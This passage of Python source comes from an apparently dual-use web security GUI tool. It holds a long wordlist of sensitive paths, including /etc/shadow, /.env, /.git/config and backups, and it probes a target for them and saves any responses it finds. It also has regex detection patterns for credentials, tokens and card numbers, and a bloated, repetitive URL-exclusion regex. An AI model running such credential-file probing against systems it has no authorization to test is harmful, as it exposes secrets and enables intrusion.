                '/apidocs/swagger-ui',
                '/apidocs/swagger-ui.html',
                '/api/documentation',
                '/api/v1/documentation',
                '/api/v2/documentation',
                '/api/v3/documentation',
                '/api/apidocs',
                '/api/v1/apidocs',
                '/api/v2/apidocs',
                '/api/v3/apidocs',
                '/api/docs',
                '/api/v1/docs',
                '/api/v2/docs',
                '/api/v3/docs',
                '/api/openapi.json',
                '/api/v1/openapi.json',
                '/api/v2/openapi.json',
                '/api/v3/openapi.json',
                '/api/openapi.yaml',
                '/api/v1/openapi.yaml',
                '/api/v2/openapi.yaml',
                '/api/v3/openapi.yaml',
                '/api/openapi.yml',
                '/api/v1/openapi.yml',
                '/api/v2/openapi.yml',
                '/api/v3/openapi.yml',
                '/openapi.json',
                '/openapi.yaml',
                '/openapi.yml',
                '/api-specs',
                '/api-specs/swagger.json',
                '/api-specs/swagger.yaml',
                '/api-specs/swagger.yml',
                '/api-specs/openapi.json',
                '/api-specs/openapi.yaml',
                '/api-specs/openapi.yml',
                '/api/spec',
                '/api/v1/spec',
                '/api/v2/spec',
                '/api/v3/spec',
                '/api/spec.json',
                '/api/v1/spec.json',
                '/api/v2/spec.json',
                '/api/v3/spec.json',
                '/api/spec.yaml',
                '/api/v1/spec.yaml',
                '/api/v2/spec.yaml',
                '/api/v3/spec.yaml',
                '/api/spec.yml',
                '/api/v1/spec.yml',
                '/api/v2/spec.yml',
                '/api/v3/spec.yml',
                '/spec',
                '/spec.json',
                '/spec.yaml',
                '/spec.yml',
                '/api/definition',
                '/api/v1/definition',
                '/api/v2/definition',
                '/api/v3/definition',
                '/api/definition.json',
                '/api/v1/definition.json',
                '/api/v2/definition.json',
                '/api/v3/definition.json',
                '/api/definition.yaml',
                '/api/v1/definition.yaml',
                '/api/v2/definition.yaml',
                '/api/v3/definition.yaml',
                '/api/definition.yml',
                '/api/v1/definition.yml',
                '/api/v2/definition.yml',
                '/api/v3/definition.yml',
                '/definition',
                '/definition.json',
                '/definition.yaml',
                '/definition.yml',
                
                # JWT-related paths
                '/.well-known/jwks.json',
                '/.well-known/oauth-authorization-server',
                '/.well-known/openid-configuration',
                '/.well-known/jwks',
                '/.well-known/oauth2-configuration',
                '/.well-known/oauth2-authorization-server',
                '/.well-known/oauth2-metadata',
                '/.well-known/oauth2-provider',
                '/.well-known/oauth2',
                '/.well-known/openid',
                '/jwks.json',
                '/oauth2/jwks',
                '/oauth2/keys',
                '/oauth2/certs',
                '/oauth2/.well-known/jwks.json',
                '/oauth2/.well-known/openid-configuration',
                '/openid/jwks',
                '/openid/keys',
                '/openid/certs',
                '/openid/.well-known/jwks.json',
                '/openid/.well-known/openid-configuration',
                '/auth/jwks',
                '/auth/keys',
                '/auth/certs',
                '/auth/.well-known/jwks.json',
                '/auth/.well-known/openid-configuration',
                '/api/jwks',
                '/api/keys',
                '/api/certs',
                '/api/.well-known/jwks.json',
                '/api/.well-known/openid-configuration',
                '/identity/jwks',
                '/identity/keys',
                '/identity/certs',
                '/identity/.well-known/jwks.json',
                '/identity/.well-known/openid-configuration',
                '/sso/jwks',
                '/sso/keys',
                '/sso/certs',
                '/sso/.well-known/jwks.json',
                '/sso/.well-known/openid-configuration',
                '/login/jwks',
                '/login/keys',
                '/login/certs',
                '/login/.well-known/jwks.json',
                '/login/.well-known/openid-configuration',
                '/token/jwks',
                '/token/keys',
                '/token/certs',
                '/token/.well-known/jwks.json',
                '/token/.well-known/openid-configuration',
                '/keys',
                '/certs',
                '/certificates',
                '/public-keys',
                '/public-keys.json',
                '/public-keys.pem',
                '/public-keys.txt',
                '/public-keys.xml',
                '/public-keys.jwks',
                '/public-keys.jwk',
                '/public-keys.jwt',
                '/public-keys.jws',
                '/public-keys.jwe',
                '/public-keys.jwa',
                '/public-keys.jwk.json',
                '/public-keys.jwt.json',
                '/public-keys.jws.json',
                '/public-keys.jwe.json',
                '/public-keys.jwa.json',
                '/public-keys.jwk.pem',
                '/public-keys.jwt.pem',
                '/public-keys.jws.pem',
                '/public-keys.jwe.pem',
                '/public-keys.jwa.pem',
                '/public-keys.jwk.txt',
                '/public-keys.jwt.txt',
                '/public-keys.jws.txt',
                '/public-keys.jwe.txt',
                '/public-keys.jwa.txt',
                '/public-keys.jwk.xml',
                '/public-keys.jwt.xml',
                '/public-keys.jws.xml',
                '/public-keys.jwe.xml',
                '/public-keys.jwa.xml',
                '/public-keys.jwk.jwks',
                '/public-keys.jwt.jwks',
                '/public-keys.jws.jwks',
                '/public-keys.jwe.jwks',
                '/public-keys.jwa.jwks',
                '/public-keys.jwk.jwk',
                '/public-keys.jwt.jwk',
                '/public-keys.jws.jwk',
                '/public-keys.jwe.jwk',
                '/public-keys.jwa.jwk',
                '/public-keys.jwk.jwt',
                '/public-keys.jwt.jwt',
                '/public-keys.jws.jwt',
                '/public-keys.jwe.jwt',
                '/public-keys.jwa.jwt',
                '/public-keys.jwk.jws',
                '/public-keys.jwt.jws',
                '/public-keys.jws.jws',
                '/public-keys.jwe.jws',
                '/public-keys.jwa.jws',
                '/public-keys.jwk.jwe',
                '/public-keys.jwt.jwe',
                '/public-keys.jws.jwe',
                '/public-keys.jwe.jwe',
                '/public-keys.jwa.jwe',
                '/public-keys.jwk.jwa',
                '/public-keys.jwt.jwa',
                '/public-keys.jws.jwa',
                '/public-keys.jwe.jwa',
                '/public-keys.jwa.jwa',
                
                # Configuration files
                '/web.config',
                '/web.conf',
                '/config.php',
                '/config.json',
                '/.env',
                '/.env.production',
                '/.env.development',
                '/.env.local',
                '/.htaccess',
                '/.htpasswd',
                
                # System files
                '/etc/passwd',
                '/etc/shadow',
                '/etc/hosts',
                '/etc/hostname',
                '/etc/group',
                '/etc/shadow-',
                '/etc/passwd-',
                
                # Backup files
                '/backup.zip',
                '/backup.tar',
                '/backup.tar.gz',
                '/backup.sql',
                '/database.sql',
                '/dump.sql',
                
                # Version control
                '/.git/config',
                '/.git/HEAD',
                '/.git/index',
                '/.git/logs/HEAD',
                '/.svn/entries',
                '/.hg/store/00manifest.i',
                
                # Documentation
                '/README.md',
                '/README.txt',
                '/CHANGELOG.md',
                '/LICENSE',
                
                # API and metadata
                '/.well-known/security.txt',
                '/crossdomain.xml',
                '/clientaccesspolicy.xml',
                '/robots.txt',
                '/sitemap.xml',
                
                # Log files
                '/logs/error.log',
                '/logs/access.log',
                '/var/log/apache2/access.log',
                '/var/log/apache2/error.log',
                '/var/log/nginx/access.log',
                '/var/log/nginx/error.log',
                
                # Database files
                '/db.sqlite3',
                '/database.sqlite',
                '/app.db',
                
                # Temporary files
                '/temp.txt',
                '/tmp.txt',
                '/test.txt',
                
                # Common backup patterns
                '/backup/',
                '/backups/',
                '/old/',
                '/archive/',
                
                # Common admin interfaces
                '/admin/',
                '/administrator/',
                '/manager/',
                '/phpmyadmin/',
                '/adminer.php',
                
                # Common debug files
                '/debug.log',
                '/error.log',
                '/phpinfo.php',
                '/info.php',
                
                # Common sensitive directories
                '/private/',
                '/secret/',
                '/confidential/',
                '/secure/',
                
                # Common API documentation
                '/api-docs/',
                '/swagger/',
                '/swagger-ui/',
                '/api/v1/docs/',
                
                # Common development files
                '/package.json',
                '/composer.json',
                '/requirements.txt',
                '/pom.xml',
                
                # Common security files
                '/security.txt',
                '/.well-known/security.txt',
                '/security.html',
                
                # Common cache files
                '/cache/',
                '/tmp/',
                '/temp/',
                
                # Common upload directories
                '/uploads/',
                '/files/',
                '/images/',
                '/media/',
                
                # Common backup patterns with dates
                '/backup_2023.zip',
                '/backup_2023.tar.gz',
                '/backup_2023.sql',
                
                # Common configuration backups
                '/config.bak',
                '/config.old',
                '/config.backup',
                
                # Common database backups
                '/database.bak',
                '/database.old',
                '/database.backup',
                
                # Common log backups
                '/logs.bak',
                '/logs.old',
                '/logs.backup'
            ]
            
            # Create results window
            results_window = tk.Toplevel(self.root)
            results_window.title("Common Files Check Results")
            results_window.geometry("800x600")
            
            # Create text area for results
            results_frame = ttk.Frame(results_window)
            results_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
            
            # Add label
            ttk.Label(results_frame, text="Checking for common sensitive files...").pack(pady=5)
            
            # Create text area for results
            results_text = tk.Text(results_frame, wrap=tk.WORD)
            results_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
            
            # Add scrollbar
            scrollbar = ttk.Scrollbar(results_text)
            scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
            results_text.config(yscrollcommand=scrollbar.set)
            scrollbar.config(command=results_text.yview)
            
            # Add progress bar
            progress_frame = ttk.Frame(results_window)
            progress_frame.pack(fill=tk.X, padx=5, pady=5)
            
            progress = ttk.Progressbar(progress_frame, mode='determinate', maximum=len(sensitive_files))
            progress.pack(fill=tk.X, expand=True, padx=5)
            
            def check_files():
                found_files = []
                try:
                    # Get headers from original request
                    headers = {}
                    for line in request_lines[1:]:
                        if ':' in line:
                            key, value = line.split(':', 1)
                            headers[key.strip()] = value.strip()
                    
                    # Configure proxy if enabled
                    proxies = None
                    verify = True
                    if self.use_proxy.get():
                        proxy_address = self.proxy_address.get().strip()
                        if not proxy_address:
                            messagebox.showerror("Error", "Please enter a proxy address")
                            return
                        proxies = {
                            'http': proxy_address,
                            'https': proxy_address
                        }
                        verify = self.verify_cert.get()
                    
                    for i, file_path in enumerate(sensitive_files):
                        # Update progress
                        progress['value'] = i + 1
                        results_window.update()
                        
                        # Try the file path
                        url = f"{base_url}{file_path}"
                        try:
                            response = requests.get(
                                url, 
                                headers=headers, 
                                verify=verify,
                                proxies=proxies,
                                timeout=5,
                                allow_redirects=False
                            )
                            if response.status_code == 200:
                                found_files.append((file_path, url, response))
                                results_text.insert(tk.END, f"✅ Found: {file_path}\n")
                            else:
                                results_text.insert(tk.END, f"❌ Not found: {file_path}\n")
                        except:
                            results_text.insert(tk.END, f"❌ Error checking: {file_path}\n")
                        
                        results_text.see(tk.END)
                    
                    # Show summary
                    results_text.insert(tk.END, "\n=== Summary ===\n")
                    results_text.insert(tk.END, f"Total files checked: {len(sensitive_files)}\n")
                    results_text.insert(tk.END, f"Files found: {len(found_files)}\n\n")
                    
                    if found_files:
                        results_text.insert(tk.END, "Found files:\n")
                        for file_path, url, response in found_files:
                            results_text.insert(tk.END, f"- {file_path}\n")
                            results_text.insert(tk.END, f"  URL: {url}\n")
                            results_text.insert(tk.END, f"  Response length: {len(response.text)} bytes\n\n")
                    
                    # Save found files to a report
                    if found_files:
                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        report_file = f"common_files_report_{timestamp}.txt"
                        with open(report_file, 'w') as f:
                            f.write("=== Common Files Check Report ===\n\n")
                            f.write(f"Base URL: {base_url}\n")
                            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                            f.write("Found files:\n")
                            for file_path, url, response in found_files:
                                f.write(f"\nFile: {file_path}\n")
                                f.write(f"URL: {url}\n")
                                f.write(f"Response length: {len(response.text)} bytes\n")
                                f.write("Response headers:\n")
                                for key, value in response.headers.items():
                                    f.write(f"  {key}: {value}\n")
                                f.write("\nResponse content (first 1000 chars):\n")
                                f.write(response.text[:1000])
                                f.write("\n" + "="*50 + "\n")
                        
                        messagebox.showinfo("Report Saved", f"Report saved to {report_file}")
                
                except Exception as e:
                    results_text.insert(tk.END, f"\nError: {str(e)}\n")
            
            # Run the check in a separate thread
            import threading
            threading.Thread(target=check_files, daemon=True).start()
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to check common files: {str(e)}")

    def analyze_static_file(self):
        # Create a new window for file analysis
        analysis_window = tk.Toplevel(self.root)
        analysis_window.title("Static File Analysis")
        analysis_window.geometry("1000x800")
        
        # Create main frame
        main_frame = ttk.Frame(analysis_window)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Create input frame
        input_frame = ttk.LabelFrame(main_frame, text="Paste File Content")
        input_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        # Create text area for input
        input_text = tk.Text(input_frame, wrap=tk.WORD, height=15)
        input_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Add scrollbar
        input_scrollbar = ttk.Scrollbar(input_text)
        input_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        input_text.config(yscrollcommand=input_scrollbar.set)
        input_scrollbar.config(command=input_text.yview)
        
        # Create results frame
        results_frame = ttk.LabelFrame(main_frame, text="Analysis Results")
        results_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        # Create text area for results
        results_text = tk.Text(results_frame, wrap=tk.WORD)
        results_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Add scrollbar
        scrollbar = ttk.Scrollbar(results_text)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        results_text.config(yscrollcommand=scrollbar.set)
        scrollbar.config(command=results_text.yview)
        
        # Create file content frame
        content_frame = ttk.LabelFrame(main_frame, text="Content with Highlights")
        content_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        # Create text area for file content
        content_text = tk.Text(content_frame, wrap=tk.WORD)
        content_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Add scrollbar
        content_scrollbar = ttk.Scrollbar(content_text)
        content_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        content_text.config(yscrollcommand=content_scrollbar.set)
        content_scrollbar.config(command=content_text.yview)
        
        # Define patterns to look for
        sensitive_patterns = {
            "API Keys": [
                r'api[_-]?key["\']?\s*[:=]\s*["\'][A-Za-z0-9_-]{20,}["\']',
                r'apikey["\']?\s*[:=]\s*["\'][A-Za-z0-9_-]{20,}["\']',
                r'<meta\s+name=["\']api-key["\']',
                r'<meta\s+name=["\']api_key["\']',
                r'<input[^>]+name=["\']api_key["\'][^>]+value=["\'][A-Za-z0-9_-]{20,}["\']',
            ],
            "Access Tokens": [
                r'access[_-]?token["\']?\s*[:=]\s*["\'][A-Za-z0-9_-]{20,}["\']',
                r'bearer[_-]?token["\']?\s*[:=]\s*["\'][A-Za-z0-9_-]{20,}["\']',
                r'<meta\s+name=["\']debug-token["\']',
                r'<meta\s+name=["\']debug_token["\']',
                r'debug[_-]?token["\']?\s*[:=]\s*["\'][A-Za-z0-9_-]{20,}["\']',
            ],
            "Secret Keys": [
                r'secret[_-]?key["\']?\s*[:=]\s*["\'][A-Za-z0-9_-]{20,}["\']',
                r'private[_-]?key["\']?\s*[:=]\s*["\'][A-Za-z0-9_-]{20,}["\']',
            ],
            "Usernames and Passwords": [
                r'username["\']?\s*[:=]\s*["\'][^"\']{3,}["\']',
                r'user["\']?\s*[:=]\s*["\'][^"\']{3,}["\']',
                r'login["\']?\s*[:=]\s*["\'][^"\']{3,}["\']',
                r'password["\']?\s*[:=]\s*["\'][^"\']{8,}["\']',
                r'pass["\']?\s*[:=]\s*["\'][^"\']{8,}["\']',
                r'pwd["\']?\s*[:=]\s*["\'][^"\']{8,}["\']',
                r'credentials["\']?\s*[:=]\s*["\'][^"\']{8,}["\']',
                r'auth["\']?\s*[:=]\s*["\'][^"\']{8,}["\']',
                r'authentication["\']?\s*[:=]\s*["\'][^"\']{8,}["\']',
                r'Password:\s*([^<>\n]+)',  # HTML format
                r'password:\s*([^<>\n]+)',  # HTML format
                r'pass:\s*([^<>\n]+)',      # HTML format
            ],
            "Database Credentials": [
                r'db[_-]?password["\']?\s*[:=]\s*["\'][^"\']{8,}["\']',
                r'database[_-]?password["\']?\s*[:=]\s*["\'][^"\']{8,}["\']',
                r'postgres[_-]?password["\']?\s*[:=]\s*["\'][^"\']{8,}["\']',
                r'pg[_-]?password["\']?\s*[:=]\s*["\'][^"\']{8,}["\']',
                r'mysql[_-]?password["\']?\s*[:=]\s*["\'][^"\']{8,}["\']',
                r'mongodb[_-]?password["\']?\s*[:=]\s*["\'][^"\']{8,}["\']',
                r'mssql[_-]?password["\']?\s*[:=]\s*["\'][^"\']{8,}["\']',
                r'sql[_-]?password["\']?\s*[:=]\s*["\'][^"\']{8,}["\']',
                r'oracle[_-]?password["\']?\s*[:=]\s*["\'][^"\']{8,}["\']',
                r'redis[_-]?password["\']?\s*[:=]\s*["\'][^"\']{8,}["\']',
                r'connection[_-]?string["\']?\s*[:=]\s*["\'][^"\']{8,}["\']',
                r'connection[_-]?uri["\']?\s*[:=]\s*["\'][^"\']{8,}["\']',
                r'db[_-]?uri["\']?\s*[:=]\s*["\'][^"\']{8,}["\']',
                r'database[_-]?uri["\']?\s*[:=]\s*["\'][^"\']{8,}["\']',
                r'DB_[A-Z_]+["\']?\s*[:=]\s*["\'][^"\']+["\']',  # Environment variables
                r'DB_[A-Z_]+=\s*[^"\'\n]+',  # Environment variables without quotes
            ],
            "JWT Tokens": [
                r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*',
            ],
            "AWS Credentials": [
                r'aws[_-]?access[_-]?key[_-]?id["\']?\s*[:=]\s*["\'][A-Z0-9]{20}["\']',
                r'aws[_-]?secret[_-]?access[_-]?key["\']?\s*[:=]\s*["\'][A-Za-z0-9/+=]{40}["\']',
                r'aws_access_key_id\s*=\s*[A-Z0-9]{20}',  # AWS config format
                r'aws_secret_access_key\s*=\s*[A-Za-z0-9/+=]{40}',  # AWS config format
            ],
            "Email Addresses": [
                r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
                r'mailto:[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
                r'Email:\s*([^<>\n]+)',  # HTML format
                r'email:\s*([^<>\n]+)',  # HTML format
            ],
            "Phone Numbers": [
                r'\b(?:\+?(\d{1,3}))?[-. (]*(\d{3})[-. )]*(\d{3})[-. ]*(\d{4})\b',  # US/Canada format
                r'\b(?:\+?(\d{1,3}))?[-. (]*(\d{2})[-. )]*(\d{4})[-. ]*(\d{4})\b',  # International format
                r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b',  # Simple format
                r'Phone:\s*([^<>\n]+)',  # HTML format
                r'phone:\s*([^<>\n]+)',  # HTML format
            ],
            "Credit Card Numbers": [
                r'\b(?:4[0-9]{12}(?:[0-9]{3})?)\b',  # Visa
                r'\b(?:5[1-5][0-9]{14})\b',  # MasterCard
                r'\b(?:3[47][0-9]{13})\b',  # American Express
                r'\b(?:3(?:0[0-5]|[68][0-9])[0-9]{11})\b',  # Diners Club
                r'\b(?:6(?:011|5[0-9]{2})[0-9]{12})\b',  # Discover
                r'\b(?:35[2-8][0-9]{13})\b',  # JCB
                r'Credit Card Number:\s*([^<>\n]+)',  # HTML format
                r'credit card:\s*([^<>\n]+)',  # HTML format
                r'card number:\s*([^<>\n]+)',  # HTML format
            ],
            "Internal IP Addresses": [
                r'\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3})\b',  # 10.0.0.0/8
                r'\b(172\.(1[6-9]|2\d|3[0-1])\.\d{1,3}\.\d{1,3})\b',  # 172.16.0.0/12
                r'\b(192\.168\.\d{1,3}\.\d{1,3})\b',  # 192.168.0.0/16
                r'\b(127\.\d{1,3}\.\d{1,3}\.\d{1,3})\b',  # 127.0.0.0/8
                r'\b(169\.254\.\d{1,3}\.\d{1,3})\b',  # 169.254.0.0/16
            ],
            "Hardcoded URLs": [
                r'https?://(?!fonts\.googleapis\.com|fonts\.gstatic\.com|cdn\.jsdelivr\.net|unpkg\.com|cdnjs\.cloudflare\.com|ajax\.googleapis\.com|code\.jquery\.com|maxcdn\.bootstrapcdn\.com|stackpath\.bootstrapcdn\.com|cdn\.bootstrapcdn\.com|cdn\.datatables\.net|cdn\.materialdesignicons\.com|cdn\.mozilla\.org|cdn\.polyfill\.io|cdn\.rawgit\.com|cdn\.socket\.io|cdn\.tinymce\.com|cdn\.wysiwyg\.com|cdn\.xss\.org|cdn\.yandex\.net|cdn\.yandex\.ru|cdn\.yandex\.com|cdn\.yandex\.com\.tr|cdn\.yandex\.com\.ua|cdn\.yandex\.com\.by|cdn\.yandex\.com\.kz|cdn\.yandex\.com\.uz|cdn\.yandex\.com\.am|cdn\.yandex\.com\.az|cdn\.yandex\.com\.ge|cdn\.yandex\.com\.kg|cdn\.yandex\.com\.md|cdn\.yandex\.com\.tj|cdn\.yandex\.com\.tm|cdn\.yandex\.com\.ee|cdn\.yandex\.com\.lt|cdn\.yandex\.com\.lv|cdn\.yandex\.com\.pl|cdn\.yandex\.com\.ro|cdn\.yandex\.com\.sk|cdn\.yandex\.com\.cz|cdn\.yandex\.com\.hu|cdn\.yandex\.com\.bg|cdn\.yandex\.com\.gr|cdn\.yandex\.com\.hr|cdn\.yandex\.com\.si|cdn\.yandex\.com\.rs|cdn\.yandex\.com\.me|cdn\.yandex\.com\.mk|cdn\.yandex\.com\.al|cdn\.yandex\.com\.ba|cdn\.yandex\.com\.co|cdn\.yandex\.com\.cr|cdn\.yandex\.com\.do|cdn\.yandex\.com\.ec|cdn\.yandex\.com\.gt|cdn\.yandex\.com\.hn|cdn\.yandex\.com\.mx|cdn\.yandex\.com\.ni|cdn\.yandex\.com\.pa|cdn\.yandex\.com\.pe|cdn\.yandex\.com\.pr|cdn\.yandex\.com\.py|cdn\.yandex\.com\.sv|cdn\.yandex\.com\.uy|cdn\.yandex\.com\.ve|cdn\.yandex\.com\.ar|cdn\.yandex\.com\.bo|cdn\.yandex\.com\.br|cdn\.yandex\.com\.cl|cdn\.yandex\.com\.cu|cdn\.yandex\.com\.dz|cdn\.yandex\.com\.eg|cdn\.yandex\.com\.il|cdn\.yandex\.com\.iq|cdn\.yandex\.com\.jo|cdn\.yandex\.com\.kw|cdn\.yandex\.com\.lb|cdn\.yandex\.com\.ly|cdn\.yandex\.com\.ma|cdn\.yandex\.com\.om|cdn\.yandex\.com\.ps|cdn\.yandex\.com\.qa|cdn\.yandex\.com\.sa|cdn\.yandex\.com\.sd|cdn\.yandex\.com\.sy|cdn\.yandex\.com\.tn|cdn\.yandex\.com\.ae|cdn\.yandex\.com\.ye|cdn\.yandex\.com\.af|cdn\.yandex\.com\.bd|cdn\.yandex\.com\.bt|cdn\.yandex\.com\.kh|cdn\.yandex\.com\.cn|cdn\.yandex\.com\.hk|cdn\.yandex\.com\.id|cdn\.yandex\.com\.in|cdn\.yandex\.com\.jp|cdn\.yandex\.com\.kr|cdn\.yandex\.com\.la|cdn\.yandex\.com\.mm|cdn\.yandex\.com\.my|cdn\.yandex\.com\.np|cdn\.yandex\.com\.ph|cdn\.yandex\.com\.pk|cdn\.yandex\.com\.sg|cdn\.yandex\.com\.th|cdn\.yandex\.com\.tw|cdn\.yandex\.com\.vn|cdn\.yandex\.com\.au|cdn\.yandex\.com\.nz|cdn\.yandex\.com\.fj|cdn\.yandex\.com\.pg|cdn\.yandex\.com\.sb|cdn\.yandex\.com\.to|cdn\.yandex\.com\.vu|cdn\.yandex\.com\.ws|cdn\.yandex\.com\.as|cdn\.yandex\.com\.ck|cdn\.yandex\.com\.fm|cdn\.yandex\.com\.gu|cdn\.yandex\.com\.ki|cdn\.yandex\.com\.mh|cdn\.yandex\.com\.mp|cdn\.yandex\.com\.nc|cdn\.yandex\.com\.nf|cdn\.yandex\.com\.nr|cdn\.yandex\.com\.nu|cdn\.yandex\.com\.pw|cdn\.yandex\.com\.pf|cdn\.yandex\.com\.pn|cdn\.yandex\.com\.re|cdn\.yandex\.com\.sh|cdn\.yandex\.com\.tk|cdn\.yandex\.com\.tv|cdn\.yandex\.com\.um|cdn\.yandex\.com\.wf|cdn\.yandex\.com\.yt|cdn\.yandex\.com\.zm|cdn\.yandex\.com\.zw|cdn\.yandex\.com\.ao|cdn\.yandex\.com\.bj|cdn\.yandex\.com\.bw|cdn\.yandex\.com\.bf|cdn\.yandex\.com\.bi|cdn\.yandex\.com\.cm|cdn\.yandex\.com\.cv|cdn\.yandex\.com\.cf|cdn\.yandex\.com\.td|cdn\.yandex\.com\.km|cdn\.yandex\.com\.cg|cdn\.yandex\.com\.cd|cdn\.yandex\.com\.ci|cdn\.yandex\.com\.dj|cdn\.yandex\.com\.eg|cdn\.yandex\.com\.gq|cdn\.yandex\.com\.er|cdn\.yandex\.com\.et|cdn\.yandex\.com\.ga|cdn\.yandex\.com\.gm|cdn\.yandex\.com\.gh|cdn\.yandex\.com\.gn|cdn\.yandex\.com\.gw|cdn\.yandex\.com\.ke|cdn\.yandex\.com\.ls|cdn\.yandex\.com\.lr|cdn\.yandex\.com\.mg|cdn\.yandex\.com\.mw|cdn\.yandex\.com\.ml|cdn\.yandex\.com\.mr|cdn\.yandex\.com\.mu|cdn\.yandex\.com\.yt|cdn\.yandex\.com\.ma|cdn\.yandex\.com\.mz|cdn\.yandex\.com\.na|cdn\.yandex\.com\.ne|cdn\.yandex\.com\.ng|cdn\.yandex\.com\.rw|cdn\.yandex\.com\.st|cdn\.yandex\.com\.sn|cdn\.yandex\.com\.sc|cdn\.yandex\.com\.sl|cdn\.yandex\.com\.so|cdn\.yandex\.com\.za|cdn\.yandex\.com\.ss|cdn\.yandex\.com\.sd|cdn\.yandex\.com\.sz|cdn\.yandex\.com\.tz|cdn\.yandex\.com\.tg|cdn\.yandex\.com\.tn|cdn\.yandex\.com\.ug|cdn\.yandex\.com\.eh|cdn\.yandex\.com\.zm|cdn\.yandex\.com\.zw)[^\s<>"]+',
            ]
        }
        
        def analyze_content():
            content = input_text.get("1.0", tk.END).strip()
            if not content:
                messagebox.showerror("Error", "Please paste some content to analyze")
                return
            
            try:
                # Display content
                content_text.delete("1.0", tk.END)
                content_text.insert("1.0", content)
                
                # Clear previous results
                results_text.delete("1.0", tk.END)
                
                # Analyze content
                findings = []
                for category, patterns in sensitive_patterns.items():
                    for pattern in patterns:
                        matches = re.finditer(pattern, content, re.IGNORECASE)
                        for match in matches:
                            start, end = match.span()
                            line_number = content[:start].count('\n') + 1
                            line_start = content.rfind('\n', 0, start) + 1
                            line_end = content.find('\n', end)
                            if line_end == -1:
                                line_end = len(content)
                            line = content[line_start:line_end].strip()
                            
                            findings.append({
                                'category': category,
                                'line': line_number,
                                'match': match.group(),
                                'context': line
                            })
                
                # Display findings
                if findings:
                    results_text.insert(tk.END, f"Found {len(findings)} potential security issues:\n\n")
                    
                    # Group findings by category
                    findings_by_category = {}
                    for finding in findings:
                        if finding['category'] not in findings_by_category:
                            findings_by_category[finding['category']] = []
                        findings_by_category[finding['category']].append(finding)
                    
                    # Display findings by category
                    for category, category_findings in findings_by_category.items():
                        results_text.insert(tk.END, f"\n{category}:\n")
                        for finding in category_findings:
                            results_text.insert(tk.END, f"  Line {finding['line']}: {finding['match']}\n")
                            results_text.insert(tk.END, f"  Context: {finding['context']}\n\n")
                    
                    # Highlight findings in content
                    content_text.tag_configure('highlight', background='yellow')
                    for finding in findings:
                        line_start = f"{finding['line']}.0"
                        line_end = f"{finding['line']}.end"
                        content_text.tag_add('highlight', line_start, line_end)
                else:
                    results_text.insert(tk.END, "No sensitive information found in the content.")
                
            except Exception as e:
                messagebox.showerror("Error", f"Failed to analyze content: {str(e)}")
        
        # Add analyze button
        analyze_button = ttk.Button(main_frame, text="Analyze Content", command=analyze_content)
        analyze_button.pack(pady=10)

def main():
    root = tk.Tk()
    app = HTTPRequestTool(root)
    root.mainloop()

if __name__ == "__main__":
    main()
